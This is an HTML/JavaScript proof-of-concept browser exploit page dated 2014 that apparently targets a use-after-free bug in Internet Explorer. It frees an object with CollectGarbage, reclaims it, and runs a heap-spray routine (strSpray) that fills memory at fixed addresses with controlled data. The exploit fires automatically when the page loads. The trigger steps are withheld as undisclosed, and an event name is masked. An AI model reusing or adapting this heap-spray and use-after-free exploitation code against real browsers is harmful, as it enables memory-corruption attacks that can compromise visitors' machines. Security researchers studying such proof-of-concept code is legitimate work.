<!--
 Author: Chen Zhang (@demi6od) <demi6d@gmail.com>
 Date: 2014 May 23rd
-->

<!doctype html>
<html>
    <head>
        <meta http-equiv='Cache-Control' content='no-cache'/>
        <script>		
            function dword2data(dword) {
                var data = Number(dword).toString(16);
                while (data.length < 8) {
                    data = '0' + data;
                }
                return unescape('%u' + data.substr(4, 8) + '%u' + data.substr(0, 4));
            }

            function strSpray(blockSize, arrLen, sprayArr, hasTag) {
                var titleArr = [];
                for (var i = 0; i < arrLen; i++) {
                    titleArr[i] = document.createElement('div');
                }

                var sprayData = '';
                for (var i = 0; i < sprayArr.length; i++) {
                    sprayData += dword2data(sprayArr[i]);
                }

                var data = '';
                if (hasTag) {
                    data += dword2data(0xdeadc0de);
                }
                while(data.length < blockSize + 0x20) {
                    data += sprayData;
                }
                var titleStr = data.substring(0, (blockSize - 2) / 2);

                for (var i = 0; i < arrLen; i++) {
                    titleArr[i].title = titleStr.substring(0, titleStr.length);
                }

                return titleArr;
            }			

            function testcase() {
                // Create new thread to exploit
                demiWin = window.open('demiWin.html');

                // Build DOM Tree... (No disclosure before patched)

                demiFront = function() {	
                    // Fuzz DOM and CSS... (No disclosure before patched)

                    id_0['onXXXX'] = function() {	
                        // Free object
                        document.body.outerText = "";
                        CollectGarbage();

                        // Occupy UAF object
                        var addr = [0x0d0d0320];
                        strSpray(0xc0, 0x500, addr);

                        // Spray totally controlled data for exploit
                        var sprayArr = [
                            0x3d0d0320,
                            0x3d0d1320,
                            0xff0d2320,
                            0xffffffff,	
                            0x3d0d43ff,	
                            0x3d0d5320,	
                            0x3d0d6320,	
                            0x00200020,
                            0x3d0d8300,	
                            0x0d0df300,	
                            0x3d0da320,	
                            0x3d0db320,	
                            0x3d0dc320,	
                            0x3d0dd320,	
                            0x0d618820,	
                            0x3d0df30d,

                            0x3d1d0308,
                            0x3d1d1320,
                            0x3d1d2320,
                            0x3d1d3320,	
                            0x3d1d4320,	
                            0x3d0d0d64,	
                            0x3d1d6320,	
                            0x00200020,
                            0x3d0d8300,	
                            0x0d0df300,	
                            0x3d1da320,	
                            0x3d1db320,	
                            0x3d1dc320,	
                            0x3d1dd320,	
                            0x0d618320,	
                            0x3d0df30d,

                            0x3d2d0320,
                            0x3d2d1320,
                            0x3d2d2320,
                            0x3d2d3320,	
                            0x3d2d4320,	
                            0x3d2d5320,	
                            0x0d0d6420,	
                            0x0020003d,
                            0x3d2d8300,	
                            0x0d0df300,	
                            0x3d2da320,	
                            0x3d2db320,	
                            0x3d2dc320,	
                            0x3d2dd320,	
                            0x0d618820,	
                            0x3d0df30d,

                            0x3d2d0320,
                            0x3d2d1320,
                            0x3d2d2320,
                            0x3d2d3320,	
                            0x3d2d4320,	
                            0x3d2d5320,	
                            0x3d2d6320,	
                            0x00200020,
                            0x3d0d8300,	
                            0x0d0df300,	
                            0x3d2da320,	
                            0x3d2db320,	
                            0x3d2dc320,	
                            0x3d2dd320,	
                            0x3d618820,	
                            0x3d0df30d,
                        ];
                        strSpray(0x200000, 0x200, sprayArr, true);
                    };
                }
                demiFront();
            }
        </script>
    </head>
    <body onload='testcase();'>
    </body>
</html>
